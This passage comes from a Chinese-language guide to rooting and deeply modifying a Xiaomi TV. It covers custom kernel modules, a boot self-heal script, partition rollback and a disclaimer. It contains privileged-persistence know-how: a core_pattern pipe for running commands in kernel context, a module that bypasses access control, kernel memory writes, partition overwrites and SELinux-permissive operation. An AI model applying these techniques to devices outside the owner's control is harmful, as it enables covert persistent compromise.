su -c 'sh /data/adb/kcap_dump.sh'          # 落盘 /data/adb/kcap_last.pcap
echo off > /proc/kcap                       # 暂停/恢复(clear=清 ring)
```

实测: 128 槽全部合法 IPv4（TCP60+UDP62+ICMP6），5 元组精确（mDNS/SSDP/ADB
全可见）。落盘脚本 kcap_dump.sh 内嵌 24B 全局头（magic a1b2c3d4/version 2.4/
LINKTYPE_RAW）。

**kwatch（sys_call_table 完整性监控 + 自动自愈）**——设计参照 ksentinel
（512 条目监控）与 LKRG（响应策略），取"检测+自动恢复"（比 LKRG 的 panic
温和）:

- init 时对 sys_call_table 全 512 条目拍基线（开机早期加载=干净基线）
- kthread 每 30s 对比 → 篡改: printk 告警 + `probe_kernel_write` 写回基线
  （自愈，绕只读页）+ violations 计数
- `echo check > /proc/kwatch`（立即校验）/ `echo test`（**自演注入**: 篡改
  slot[500] resvd 空槽 → 检出 → 自愈 → 复核）/ `echo "heal off"`（关闭自愈）

**实测自演闭环**: `selftest detect=1 after-heal=0 PASS`——篡改 slot[500]
写入 0xdeadbeef → 检出 1 → probe 写回 0 → 复核干净。

**排错实录**（适用一切手工 proc write 模块）:

1. **write 切行必须减 n**: 切 '\n' 只置 0 不减 n → "test\n" 的 n=5 ≠ 分支
   要求的 4 → 分支永不进入（read 正常 write 静默失效的典型现象）。
2. **insmod 静默失败无 dmesg**: helper 的 insmod 报错被 usermodehelper 丢弃——
   用 kxmen 通道手动 insmod 抓真实输出（`kx "insmod ... > out.txt 2>&1"`）。
3. **常量注入测试**: 槽位原值是 0（resvd）时写 0 无差异——注入值用 0xdeadbeef。

### 13.7 scrcpy 电脑投屏控制（已实测）

电视端 scrcpy-server v2.7（/data/local/tmp/scrcpy-server.jar，API 21+ 兼容
Android 5/6；音频转发需 Android 11+ 故禁用）。PC 端下载
scrcpy-win64-v2.7.zip（github.com/Genymobile/scrcpy/releases，经镜像代理），
连接:

```
scrcpy.exe --tcpip=<TV_IP>:5555 --no-audio --max-size=1280 --max-fps=30 --video-bit-rate=4M
```

客户端自动推送同版本 server 并启动——电视侧进程特征
`app_process / com.genymobile.scrcpy.Server 2.7 ... audio=false`。参数降载
适配老电视编码器（1280/30fps/4Mbps）。

**勿多开（实测事故）**: 两个 server 实例并存会抢同一编码器，老电视的
surfaceflinger 扛不住 → SF 崩溃关闭显示（dmesg `fb: osd[1] enable: 0`）→
system_server 死亡 → **电视黑屏按键无反应**。恢复: adb reboot（内核健在，
约 1 分钟全套体系自愈归位）。预防: 一次只跑一个 scrcpy 会话；加
`--stay-awake` 防电视息屏（息屏时镜像全黑属正常现象，非故障）。清理残留:
`su -c 'for p in /proc/[0-9]*; do ... kill ...'` 杀全部 scrcpy 进程。

注意: 小米部分设备键鼠注入需要
"USB 调试(安全设置)"选项（电视上通常没有该项）——鼠标控制一般可用，键盘
输入受限时走 ADB input text 替代。

### 13.8 Web 内核控制台面板（已实测）

三段式零依赖架构（参照 Simple Dashboard 类项目的 index.html + JSON 模式）:

1. **采集**: `scripts/panel_status.sh`（kcrontab 每 60s 调用，root+全caps）——
   五模块 Live 状态、三端口、kadblock 拦截计数、kcrontab tick、kwatch 完整性、
   系统信息（uptime/内存/负载/温度）→ 原子写 `/data/adb/www/status.json`
2. **服务**: 自研 httpd（`src/httpd.c`）——**docroot 已写死收紧**
3. **面板**: `scripts/panel.html`（暗色仪表盘，fetch status.json 每 5s 刷新，
   模块/端口/拦截/监控/系统六卡片，violations>0 自动红框告警）

访问 `http://<TV_IP>:8080/panel.html`。

**安全收紧（重要实测记录）**: 早期 docroot=/sdcard 将**整个 sdcard 暴露给
局域网**（目录页可见全部文件名）。修复:

- `/init.rc` 的 `service httpd` 行参数改为 /data/adb/www（**注意: Android
  init 仅开机时解析 rc——运行期修改 rc 文件不影响已注册服务**，属下次开机
  生效的持久化层）
- `httpd.c` 二进制层**写死 docroot=/data/adb/www**（argv 忽略，当下立即生效
  且与 rc 双保险一致）+ 补 .json MIME
- 备份: /data/adb/init.rc.bak_httpd 与 /data/adb/httpd.old.bak

**电脑↔电视文件/刷机通道总览（全部保留）**:

| 通道 | 方向 | 用途 |
|---|---|---|
| adb push/pull + dd | 双向 | **刷机主通道**（固件推送+分区写入，全部实战验证） |
| SSH/SFTP (22) | 双向 | WinSCP 图形界面拖拽，任意目录 |
| `scripts/share.sh` | 电视→电脑 | **按需临时开门**: `su -c 'sh /data/local/tmp/share.sh /sdcard/Download'` → 浏览器 http://<TV_IP>:8081 下载，用完 `share.sh off` 关门。httpd 白名单: /sdcard 整盘拦截（安全洞），子目录与其他路径放行 |
| U 盘 (xmen.recovery) | 离线 | 无电脑救砖/刷机 |

**本机排错实录**（适用同类环境）: ① Android 6 无 sed（用 awk 替代）；
② `grep -q` 触发 Broken pipe 且 `&& VAR=1` 在 mksh 下赋值污染——改 `grep -c`
接命令替换；③ kcrontab 喂回整文件时 NTASK 槽位不足静默丢任务（扩容 12）；
④ usermodehelper 环境 date 无时区数据（`TZ=CST-8` 前缀修正）。

### 14. 内核态治理体系（终态全景）

长期常驻的内核治理栈（三模块 + 两个用户态入口），全部开机自愈:

| 组件 | 通道 | 职责 |
|---|---|---|
| kctl.ko | /dev/kxmen + /proc/kxmen | 全权命令通道（root+全caps+kernel context） |
| kadblock.ko | /proc/kadblock | DNS 捕获 + 广告拦截（UDP DNS 全量覆盖）+ SNI 识别 |
| kcrontab.ko | /proc/kcrontab | 内核态定时守护（10 任务常驻，NTASK=12 槽位） |
| /data/local/tmp/kx | 写 /dev/kxmen | 用户态一行命令入口 |
| scripts/kx | 同上（部署版） | 同上 |

开机自愈链（install-recovery.sh 的 boot-time full-control 段，2026-11-17 实测落地，
3 轮重启复验全绿）:

```sh
# LKM 五模块（kctl 先加载读 token；已 Live 的跳过）
for KO in kctl kadblock kcrontab kcap kwatch; do
    if [ -f /data/adb/lkm/$KO.ko ] && ! grep -q "^$KO" /proc/modules; then
        /system/bin/insmod /data/adb/lkm/$KO.ko 2>/dev/null && echo "lkm+: $KO"
    fi
done
# kcrontab 任务（幂等：先清槽再喂，防二次喂回槽满溢出）
echo clear > /proc/kcrontab 2>/dev/null
cat /data/adb/kcrontab.txt > /proc/kcrontab 2>/dev/null
# core_pattern 队列通道（运行期换装用）
echo "|/data/local/tmp/lkm_helper.sh" > /proc/sys/kernel/core_pattern 2>/dev/null
# /data/adb 775（adb push 直写）
chmod 775 /data/adb /data/adb/lkm 2>/dev/null
# kxmen 节点 0600（App 连节点都开不了，token 为第二层；666 已弃用）
chmod 600 /dev/kxmen 2>/dev/null
# printk 限流（audit 刷屏控制）
echo "4 4 1 7" > /proc/sys/kernel/printk 2>/dev/null
echo "$(date) bootfix: lkm+kcron+core+perms" >> /data/local/tmp/bootfix.log
```

段内含 "adbwatch" 字样——heal.sh 开机覆盖检查（grep adbwatch）命中即跳过覆盖；
new2 模板同步为新版（覆盖源本身也是干净的，双重防覆盖）。kxmen 节点权限终态
为 0600（由 boot-fix 开机 chmod 保证，不依赖 ueventd.rc）。

**实测能力边界（重要）**:

- 系统 DNS 解析走标准 UDP（netd 缓存命中时不发查询——曾误判为"私有通道"，
  实为缓存行为）；UDP DNS 拦截**覆盖全部系统解析**。SNI 识别额外提供 HTTPS
  目标可见性（TLS ClientHello 明文域名）。
- su 的 capability 边界: setuid root 但 CapEff=0xC0（仅 SETUID/SETGID），
  **file caps 补全在此内核+SELinux 组合下不可行**（execve 被 EPERM，已实证并回滚）。
  全权操作统一走 kxmen 通道（kx），su 保留做半权日常操作。
- /data/adb 775 由 boot-fix 段开机恢复（历史上重启曾回落 0700，2026-11-17 起由
  install-recovery.sh 内置 chmod 解决）；printk 已限控制台级别（4 4 1 7，
  boot-fix 开机设置 + kcrontab 每 5 分钟保活双保险）。

### 14.1 开机自愈链部署与复验标准（实测闭环）

boot-fix 段部署在 /system/bin/install-recovery.sh（init 原生 class main 服务，每次开机必跑），段完整代码见上文。三条工程约束（原理详述见注意事项 28–31）：

1. **防覆盖**：段内含字面 "adbwatch"——heal.sh 的开机覆盖检查命中后跳过覆盖；new2 模板同步为新版，覆盖源同样干净。
2. **shebang 必须在文件头**：往现有脚本前插段时，段首行自带 #!/system/bin/sh，原文用 tail -n +2 砍掉自身 shebang 再拼（内核 execve 只读文件头两字节）。
3. **幂等喂回**：kcrontab 写接口无去重，喂回前先 echo clear，防重复喂回占满槽位溢出丢弃。

**复验清单**（每轮重启后跑一遍，全部命中即自愈链生效）：

| 项 | 命令 | 期望 |
|---|---|---|
| 五模块 | grep -E "kctl\|kadblock\|kcrontab\|kcap\|kwatch" /proc/modules | 全部 Live |
| core_pattern | cat /proc/sys/kernel/core_pattern | 管道 helper |
| /data/adb | ls -ld /data/adb | drwxrwxr-x（775） |
| kxmen 节点 | ls -l /dev/kxmen | crw-------（0600） |
| printk | cat /proc/sys/kernel/printk | 4 4 1 7 |
| kcrontab | cat /proc/kcrontab | 全部任务（默认 10） |
| ADB | getprop service.adb.tcp.port | 5555 |

### 14.2 TFTP 网络刷机通道（env 探针，只下载到内存不写分区）

定位：U 盘引导通道之外的第二条软件刷机通道——boot 分区损坏且 U 盘不在手边时，只要网线可达，U-Boot 阶段直接从局域网主机拉取镜像。探针本身全程只下载到内存（loadaddr），**不写任何分区**；bootcmd 与 BCB 触发链一字不动。

**工具链（scripts/）**：

- tftp_server.py —— PC 端 TFTP 服务器（基于 tftpy），根目录为同目录 tftp_root/，监听 UDP 69。要下发的文件放 tftp_root/（如 test8m.bin、boot.img）。运行：`python tftp_server.py`。
- patch_env_tftp.py —— env 分区重建式修改：追加 serverip / ipaddr / netmask / gatewayip / tftpfile / tftp_en 六个网络变量，并在 switch_bootmode 的 normal 尾段插入探针。CRC 覆盖 [4:0x10000) 共 0xFFFC 字节，输出恰为 0x10000 整（本设备 env 无 flags 字节）。用法：
  1. 先导出当前 env：`adb shell "su -c 'dd if=/dev/block/env bs=4096 count=16'" > env_cur.bin`（或 base64 中转防 tty 换行污染）
  2. `python patch_env_tftp.py env_cur.bin env_new.bin --server <PC局域网IP>`
  3. 自检通过后 push 写回：`su -c 'dd if=/data/local/tmp/env_new.bin of=/dev/block/env bs=4096 count=16; sync'`
  4. **写回后 MD5 双侧核对**（电视端 dd 读回前 64KB 与本地文件比对）
  5. 回滚：写回前 dd 备份的 env 原样写回即可

**探针逻辑**（normal 分支尾段，每次开机必跑，tftp_en 门控）：

```sh
run init_display;
if test ${tftp_en} = 1; then
  sleep 2;                                    # 等 PHY link 协商
  if ping ${serverip}; then
    if tftp ${loadaddr} ${tftpfile}; then setenv tftp_ok 2;   # 全通
    else setenv tftp_ok 1; fi;                # 网络通但下载失败
  else setenv tftp_ok 9; fi;                  # ping 不通
  saveenv; fi;
if imgread kernel boot ${loadaddr}; then close_uart; bootm ${loadaddr}; fi;
```

**三态判读**（重启回系统后：`su -c 'dd if=/dev/block/env bs=4096 count=16' | strings | grep tftp_ok`）：

| 标记 | 含义 | 下一步 |
|---|---|---|
| 2 | 网络与下载全通 | 可进入真刷写阶段（单独确认后操作） |
| 1 | 网络通、下载失败 | PC 侧 UDP 69 入站被拦：系统防火墙与第三方防火墙都查；确认 tftp_root 内文件名与 ${tftpfile} 一致 |
| 9 | ping 不通 | U-Boot 阶段网络层不通：优先加大探针前置等待（PHY 协商时序），其次查网线/交换机口 |

**日常归零**：验证完成后将 tftp_en 置 0 写回——探针跳过，开机零延迟零网络行为；需要刷机时再置 1。探针阶段 PC 端需放行 UDP 69 入站（按路径精确匹配放行实际监听进程）。

**安全边界**：探针只下载到内存；bootcmd 与 BCB 触发链不动；写回 env 前 dd 备份 + MD5 核对；env CRC 错误时 U-Boot 回落内置默认 env（见注意事项 9），不会直接砖机。

## 注意事项

1. 所有推到设备的 .sh 必须是 LF 行尾。Windows 下 git 默认检出 CRLF，直接推上去内核找不到解释器，报的错还是很有迷惑性的 `No such file or directory`。
2. 不要用设备上的 sed 改 CRLF 文件。toybox sed 处理 `\r\n` 会产生 NUL 字节，实测出现过「旧值新值拼成一行中间夹 NUL」的损坏，属性直接加载不出来。系统文本一律在宿主机用 Python 字节级替换，整体写回。
3. 这个内核 `panic_on_oops=1`，地址算错一次就 panic 重启一次。重启本身不伤数据，但反复重启很浪费时间，所以地址必须离线校验全通过再上机。
4. 同一进程对同一个 GPU 虚拟地址重复绑定会让驱动陷入无限重试，进程永久卡死在内核态，ion 内存也跟着泄漏，只能重启恢复。gpu_arb_write.c 里已经改成每次绑定递增地址，别改回去。
5. ion carveout 内存被泄漏的进程占着不放，重启前不会再分配出来。报 `ion carveout alloc: Out of memory` 就重启设备再继续。
6. su 是 euid 0 但 capability 集是空的。mount、改别人属主的文件这类需要 CAP_SYS_ADMIN / CAP_FOWNER 的操作，全部放进 roothelper.sh 由内核上下文执行。判断标准很简单：su 里报 Operation not permitted 的操作，挪到 roothelper 里就能过。
7. 设备端 dd 不支持 conv= 参数，写分区时不要带。
8. 这台机器的 init 不解析 /system/etc/init/*.rc。开机钩子只能走 install-recovery.sh，这是 init 原生 class main 服务，每次开机必跑。
9. env 分区写回前必须先 dd 导出备份。CRC 算错的话 U-Boot 会丢弃整个环境变量集回落默认值，cmdline 少一堆参数，机器能不能起来就看运气了。
10. 如果打算改 recovery 分区，两件事缺一不可：install-recovery.sh 换成接管版（applypatch 还原逻辑已移除），TWRP 用 scripts/rebuild_twrp.py 打过补丁。少一件，开机钩子会把官方 recovery 刷回去，或者进出 TWRP 一次 env 就被改回 enforcing。
11. **/system/bin/systemcontrol 是开机必需组件，任何时候都不能改名、删除或禁用。**它是 Amlogic 启动链的一环，有服务在等它设置的属性；实测改名后开机卡死在 logo，连网络栈都不会起，adb 彻底不通。它不是 root 持久化的阻碍——真正会改写 env 的是 TWRP ramdisk 里自带的 systemcontrol_static（补丁后已中性化）。正常系统里的 systemcontrol 多次重启实测不回写 env，可以共存。
12. 系统分区改坏导致卡开机 logo 时的救援流程见「回滚」一节。核心：电视彻底断电，插好 U 盘，按住遥控器确认键通电进 TWRP（蓝牙遥控器断电时可能发不出信号，多试几组按键或改用红外遥控器），Mount 页勾上 System，Advanced -> Terminal 敲恢复命令；打字不便就用 fix.zip 救援包（Install -> 选 USB 存储 -> 刷入，全程零打字）。
13. TWRP 实用经验：它的 adb 只走 USB 线，网络连不上是正常的；Spocky 版 U 盘挂载点不是 /usb_otg，在 Mount 页勾选后用 mount 命令查实际路径；终端里直接敲 mv 等短命令，比在软键盘上戳脚本路径更可靠；Advanced -> Terminal 的软键盘可以用鼠标点。
14. **迷你系统（ramdisk）有硬体积上限：gzip 后 2.4MB 以内安全**（原版 2.23MB）。ramdisk 加载地址与内核加载区只隔 512KB，超限的 ramdisk 会让引导卡死并触发看门狗重启，死得太早连内核日志都留不下。所以往迷你系统里加东西必须做减法：脚本、钥匙、纯文本可以进；一切二进制（su、dropbear、busybox、httpd……）一律放 /data 持久分区，由脚本运行期引用。每次构建后看 build_full_boot.py 的自检 3 输出确认体积。
15. **init 拉起的服务天生是 root + 全量 capability**（这与 su 的空 capability 集完全不同）。需要 mount、chown、写他人属主文件的服务逻辑，全部放进 /heal 的脚本由 init 执行；su 里干不了的事不要硬干。
16. **dropbear 只认自家格式的主机钥匙**。OpenSSH 新格式私钥文件头（openssh 私钥头）会在启动时报 `String too long` 退出，必须用配套 dropbearkey 生成原生格式。报错日志只有一句 Early exit，不带原因，容易排查半天。
17. **dropbear 会校验登录 shell 的合法性**（遍历 /etc/shells）。安卓上这个文件不存在，任何用户都会被 `invalid shell, rejected` 拒掉。heal.sh 开机自动创建 /etc/shells（/etc 实际是 /system/etc 的符号链接，必须在 /system 挂载可写之后写）。
18. **dropbear 的 StrictModes**：登录用户的家目录必须归 root 或本人所有，且组/他人不可写，否则公钥认证直接拒绝。/data/local/tmp 本身属主是 shell 且组可写，不满足——所以 passwd 里 root 的 home 要指向专用目录（heal.sh 建的 sshhome，700，root 属主）。
19. **adbd 有一种偶发卡死状态**：5555 在监听、TCP 能通，但 adb 握手一直 offline。`setprop ctl.restart adbd` 重启一次就恢复。heal.sh 在开机末期无条件重启一次 adbd，把这个状态消灭在开机阶段。
20. **非交互 SSH 命令的 PATH 是空的**。`ssh root@电视IP "getprop"` 会报 not found——用绝对路径（/system/bin/getprop），或者在命令前加 `export PATH=/system/bin:/system/xbin:/data/local/tmp:$PATH;`。交互登录 shell 会读 .profile，不受影响。
21. **/data 上的服务二进制是 SSH/HTTP/自愈的运行前提**：su、dropbear、sftp、bb、httpd、install-recovery.sh.new2。恢复出厂设置（清 data）后按操作步骤第 7 节的清单重推一遍即可；只清 /system 的损坏不影响它们。
22. **Logo 分区与引导链完全解耦**：logo 只是一块「U-Boot 读图显示」的资源分区，改坏最坏效果是开机黑屏（图数据非法时 U-Boot 跳过显示继续引导），不会导致卡砖。条目顺序、2K 数据对齐、条目 magic 三件事在 build_logo.py 里已固化，自建镜像务必用它打包。
23. **env 里的 autoscr 调用是死代码**: 本系列 U-Boot 未编译 `CONFIG_CMD_SOURCE`，`autoscr` 与 `source` 命令都不存在，U 盘的 aml_autoscript 会被 fatload 但永远不会被执行。自动化刷入走 TWRP OpenRecoveryScript（操作步骤第 12 节）。
24. **U-Boot 的重启命令是 `reset` 不是 `reboot`**；hush shell 不支持 `$(cmd)` 命令替换，脚本里写不了日期类动态值。
25. **`store write 分区名 地址 偏移 大小` 是通用分区写命令**（EMMC 路径转 mmc write）；`store rom_write` 是 bootloader 专用，两者不要混用。
26. **bootloader 分区的 U-Boot 本体不可软件解密**: BL2 明文，BL30/BL31/BL33 为 AMLC 容器 AES-CBC 封装（固件 2022/11/03 打包），密钥走 efuse 硬件槽，软件侧不可提取。想改 U-Boot 行为的正确路径是 env 分区（明文可写），不是反编译本体。
27. **U 盘兼容性**: FAT32 单分区、根目录平铺、一次只插一个；不同 USB 口供电与枚举速度有差异，识别不到时换口重插。xmen.recovery / recovery.img / twrp.img 三个文件名同时放，覆盖不同固件版本的识别差异。
28. **heal.sh 开机会覆盖 install-recovery.sh**：覆盖条件是 `grep -q adbwatch`。往 install-recovery.sh 里加自定义段时，段内必须包含字面 "adbwatch"（一行注释即可），否则开机被 heal 从 new2 模板覆盖回纯巡检版——自定义段静默消失，没有任何日志或报错。
29. **往现有脚本前插段必须保住 shebang**：内核 execve 只看文件头两字节（#!）判定脚本类型。把自定义段拼在原文件前面、shebang 被挤到中间时，服务启动报 `Exec format error`（只有 dmesg 里一行），整个脚本开机不跑。正确做法：段首行自带 `#!/system/bin/sh`，原文用 `tail -n +2` 砍掉自己的 shebang 再拼。
30. **kcrontab 写接口没有去重**：重复喂回会占满 NTASK=12 槽位并静默丢弃溢出任务。喂回前先 `echo clear > /proc/kcrontab`（幂等），boot-fix 段已内置。
31. **su 对 shell 属主目录（如 /data/local/tmp）无写权**：uid=0 但无 CAP_DAC_OVERRIDE，按目录权限位的「其他用户」位检查。写文件的重定向放在 adb shell 层（shell 用户）执行，su 只负责读受保护文件、写块设备与 proc 节点。

## 回滚

| 项 | 备份 | 恢复 |
|---|---|---|
| env 分区 | backup/env_backup.bin | `adb push` 后 `su -c 'dd if=/sdcard/env_backup.bin of=/dev/block/env bs=4096 count=17; sync'`，重启即恢复 Enforcing |
| build.prop | 修改前导出的原版 | 同 build.prop 写回流程 |
| install-recovery.sh | 原版脚本（部署时已存 /data/local/tmp/install-recovery.sh.orig2） | cp 回去 |
| recovery 分区 | backup/recovery.img（官方原版） | `su -c 'dd if=/sdcard/recovery.img of=/dev/block/recovery bs=4096; sync'`（需同时把 install-recovery.sh 换回原版，否则开机又被刷掉） |
| boot 分区 | backup/boot.img（官方原版） | `su -c 'dd if=/sdcard/boot_stock.img of=/dev/block/boot bs=4096; sync'`，重启即回到官方内核；或用 swap_boot.bat 三版本一键对调 |
| logo 分区 | flash_logo.sh 自动备份的 /data/local/tmp/logo_backup_*.img | `su -c 'dd if=/data/local/tmp/logo_backup_*.img of=/dev/block/logo bs=4096; sync'`（按时间戳选原版那份），重启即恢复官方 Logo |
| su | — | `su -c 'rm /system/xbin/su'` |

分区级的完整备份（13 个分区全镜像）建议在第一次动任何分区之前先做一遍，纯读操作。

### 系统分区改坏后的 TWRP 救援（通用流程）

电视卡在 logo 时 adb 完全不通（init 早期死锁，网络栈都没起），恢复通道只有 TWRP：

1. 电视彻底断电，插好 U 盘，**按住遥控器确认键通电**（蓝牙遥控器断电状态可能发不出信号，多试几组按键组合，或改用红外遥控器），进 TWRP
2. **Mount** 页勾上 **System**
3. **Advanced → Terminal**，按需敲恢复命令（还原被误改的文件、或按回滚表的 dd 命令重刷分区），最后 `sync`
4. **Reboot → System**

boot 分区改坏时同样走这条路，Terminal 里一行命令还原：

```sh
dd if=/data/media/0/boot_stock.img of=/dev/block/boot bs=4096; sync
```

打字不便时改用**零打字救援包**：电脑上 `python scripts/make_fix_zip.py env_new.bin` 生成 fix.zip 放进 U 盘，TWRP 里 **Install → 选择 USB 存储 → fix.zip → 滑动刷入**。它会一并把 env 重写为 permissive。平时就把 fix.zip 备在 U 盘里，出事时是救命稻草。

### 任何意外后的兜底

官方固件包 U 盘强刷可以把 system/boot/recovery 全部刷回官方原版，电视恢复出厂状态，用户数据分区不受影响——这意味着**这套方案的所有操作在理论上都是可逆的**。

## 免责声明

**风险分级提示**：本文档所述操作按风险由低到高分为五个层级——（一）提权与内存态利用（不落盘，重启还原）；（二）系统分区与 env 分区修改（持久，可单点回滚）；（三）recovery 分区替换、迷你系统注入、开机自愈钩子（install-recovery.sh）与内核常驻定时任务（持久，涉及引导期行为与开机自动执行的命令序列）；（四）boot 分区替换与内核二进制补丁（持久，风险最高）；（五）U 盘引导与 OpenRecoveryScript 自动化刷入（引导行为不落盘；刷入范围完全由使用者预置的清单与刷入包内容决定，风险随内容浮动）。文档按层级给出对应的备份与恢复手段，使用者应根据自身能力**逐级推进，不要跳级**，每完成一层确认稳定后再进入下一层。

### 10.1 个人免责声明

1. 本文档所述内容仅适用于**使用者本人合法拥有并对其拥有完整处置权**的设备。使用者应当确认为所操作设备的唯一所有者或已取得设备所有者的明确、有效的书面授权。
2. 本文档所含全部内容（包括但不限于源码、脚本、命令、补丁位置与操作流程）仅供**技术学习、安全研究与设备维护**目的使用。使用者基于自身判断决定是否执行及执行到哪一层级，由此产生的一切后果由使用者**自行承担**。
3. 本操作涉及**内核二进制补丁、boot/recovery 分区替换、引导环境变量修改与系统分区文件变更**，是比常规 ROOT 更深层的系统改造，**存在设备无法启动（俗称「变砖」）、引导链损坏、系统功能异常、数据丢失、保修失效等风险**。其中内核与 boot 分区层的失误可能造成比普通分区损坏更难恢复的局面。尽管本文档提供了分级备份、回滚表与救援流程，仍不保证任何特定情形下均可成功恢复。使用者应在进入每一层级前自行完成该层级对应的全部备份（分区全镜像 + 官方固件包 + 救援包），并自行评估与承担全部风险。
4. ROOT、SELinux 宽容模式与内核级改动的叠加效果是：设备长期处于**无强制访问控制、任何本地进程可取得最高权限**的状态；同时本方案在设备上**常驻开启 SSH（22 端口）与 HTTP（8080 端口）网络服务**。这意味着设备持续暴露于局域网（以及端口可达的任何网络环境）之下，风险包括但不限于：任何可访问该网络的设备取得系统最高权限、设备被植入恶意程序、被用作网络攻击跳板、数据泄露、密钥泄露。由此导致的设备被入侵、数据泄露、财产损失或其他任何损害，均由使用者自行承担。使用者应自行采取隔离措施（如防火墙、仅限可信网络使用）并持续关注。
5. **密钥保管责任**：本方案包含 SSH 主机私钥与客户端私钥，二者均为具有登录效力的电子凭证。使用者应妥善保管私钥文件，不得泄露、转借或公开发布；私钥一经泄露应立即更换钥匙对并重新部署。因密钥保管不善导致的任何后果由使用者自行承担。
6. 本文档引用的第三方软件组件（包括但不限于 dropbear SSH、busybox 及其相关构建产物）归其各自权利人所有，使用者应自行了解其许可证条款与已知漏洞，并自行决定是否使用及承担使用风险。本文档作者/发布者不对第三方组件的安全性、可用性作任何担保。
7. 本文档作者/发布者**不提供任何形式的担保**，无论是明示的还是默示的，包括但不限于对适销性、特定用途适用性、不侵权及「操作必然成功」的默示担保。文档与全部配套代码按「现状」提供。
8. 本文档描述的内核补丁位置、分区布局与地址均**针对特定固件版本实测得出**，不构成对其他固件版本的承诺。在其他版本上套用本文数值属于使用者的独立决策，风险与后果由使用者自行承担。
9. **U 盘引导与自动化刷入**: 本文档包含通过 U 盘引导第三方 recovery 与 OpenRecoveryScript 自动化刷入的流程。U 盘引导本身不修改设备存储；自动化刷入的写入范围完全由使用者预置的清单（openrecoveryscript）与刷入包内容决定。自动化流程存在脚本错误导致重复刷入、误刷目标分区、数据清除的风险，使用者应在正式使用前**先用无害测试包验证清单行为**，并对清单与刷入包的全部内容负审查责任。
10. **Magisk 组件**: 文档引用的 Magisk root 方案（含 magiskinit、magiskboot 等组件）归其权利人所有，按其自身许可条款提供。使用者应自行了解其工作原理（修改 boot 镜像注入提权组件）与适用条件（特定 Android 版本与内核），并自行承担使用后果。

### 10.2 法律免责条款

1. **合法性确认**：使用者应事先了解并遵守其所在国家或地区的所有适用法律法规，包括但不限于著作权法、计算机信息系统安全保护相关法规、网络安全法及进出口管制规定。因违反任何适用法律而使用本文档内容所产生的一切法律责任，由使用者独自承担，与文档作者/发布者无关。
2. **禁止用途**：本文档内容**不得**用于以下任何目的：
   - 对非本人所有或未获明确授权的设备实施本方案中的任何操作；
   - 任何形式的未授权访问、入侵、破坏、数据窃取、监听或其他违法行为；
   - 规避数字版权管理（DRM）机制以获取未授权的受保护内容；
   - 商业牟利、恶意竞争、报复或任何损害他人合法权益的行为；
   - 任何学习、研究、个人设备维护之外的分发与再利用。
3. **修改固件的法律边界**：修改设备固件可能违反设备制造商的用户协议、影响数字版权管理机制的完整性，在部分司法辖区可能受到法律限制。使用者应自行确认其行为在其司法辖区的合法性，并承担全部法律后果。
4. **第三方软件合规**：本方案引用的第三方组件（dropbear、busybox 等）各有其自身的许可证（MIT、GPL 等）。使用者再分发或集成这些组件时，应自行遵守对应许可证的署名、源码公开等义务，相关合规责任由使用者承担。
5. **责任限制**：在任何情形下，文档作者/发布者均不对因使用或无法使用本文档内容而产生的任何直接、间接、附带、特殊、惩罚性或后果性损害承担责任（包括但不限于设备损坏、变砖、数据丢失、业务中断、利润损失、隐私泄露、人身或财产损害）。使用者使用本文档内容即表示明确接受此责任限制。
6. **第三方权益与索赔**：使用者应确保其操作不侵犯任何第三方的著作权、专利权、商标权或其他合法权益。因使用者行为引发的第三方索赔、投诉或法律程序，由使用者自行应对并承担全部责任。
7. **服务与保修**：本操作（包括 ROOT、系统分区修改、boot/recovery 分区替换与内核补丁）大概率导致设备制造商提供的保修服务失效，并可能影响官方售后对设备的诊断与修复。使用者应自行确认并承担相关后果。
8. **内容时效**：本文档基于特定固件版本与特定时间点的系统状态整理，制造商后续固件（如官方恢复更新服务）可能使文中方法失效或产生未知冲突。使用者应自行验证适用性。
9. **条款生效与变更**：使用者下载、阅读、复制或以任何方式使用本文档内容，即视为已完整阅读、充分理解并无条件接受本免责声明的全部条款。若不接受任何一条，应立即停止使用并删除全部相关内容。文档作者/发布者保留随时更新本免责声明的权利，更新后的条款自发布时生效。
10. **自动化脚本合规**: OpenRecoveryScript 等自动化机制可对设备执行任意刷写、清除与重启操作。使用者不得将其用于对非本人所有或未获授权的设备实施自动化刷写、清除、破坏或任何未授权变更；预置自动化清单前应充分验证其行为范围，并保留自己审查过清单内容的记录。
11. **未 Root 设备复用**: 本文档提供的未 Root 设备复用流程仅适用于使用者本人合法拥有或已获明确授权的设备。利用该流程对他人设备实施未经授权的解锁、root 或数据操作属于违法行为，责任由实施者独自承担。
12. **内核常驻组件与开机探针**: 治理体系包含内核态定时任务模块（按使用者配置周期执行任意命令）与开机自愈钩子（每次开机自动加载内核模块、恢复权限并执行任务喂回）。可选的 TFTP 探针在开启状态（tftp_en=1）下，每次开机向局域网内指定主机发起 ping 与 TFTP 下载尝试，该网络行为对局域网内设备可见。以上组件的全部配置内容（任务清单、探针目标、下载文件）由使用者自行设定并独自承担审查与后果责任；开启状态下设备应处于可信局域网内，验证完成后建议将探针门控归零（tftp_en=0）以消除开机网络行为。
13. **内核模块长期常驻**: 五个内核模块（全权执行通道、DNS 捕获拦截、定时守护、抓包、监控）以 Live 状态长期驻留，其行为绕过用户态全部访问控制。模块代码与配置由使用者自行编译、审查与部署，由此产生的稳定性风险与安全风险（含任何依赖内核接口变化导致的不可预期行为）由使用者自行承担。

---

*本文档基于 L55M5-EC（build 3396）实测整理。其他版本固件请按操作步骤第 2 节重新计算全部地址并通过校验后再执行。*
